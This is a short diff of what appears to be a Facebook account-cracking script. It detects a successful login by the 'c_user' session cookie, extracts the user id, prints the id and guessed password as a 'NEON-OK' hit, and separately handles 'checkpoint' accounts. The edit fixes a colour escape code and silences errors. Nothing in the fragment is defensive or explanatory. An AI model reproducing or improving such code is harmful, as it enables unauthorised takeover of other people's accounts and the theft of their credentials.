@@ -93,7 +93,7 @@ class rand():
                 if "c_user" in log_cookies:
                     cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid = re.findall('c_user=(.*);xs', cookie)[0]
-                    print("\r\x1b[38;5:46m NEON-OK • %s • %s\x1b[m"%(uid,pas))
+                    print("\r\x1b[38;5;46m NEON-OK • %s • %s\x1b[m"%(uid,pas))
                     self.oks.append(uid)
                     break
                 elif "checkpoint" in log_cookies:
@@ -104,7 +104,7 @@ class rand():
                     break 
                 else:continue
             self.loop+=1
-        except Exception as e:print(e)
+        except Exception as e:pass
 
 if __name__ == "__main__":
     os.system('clear')
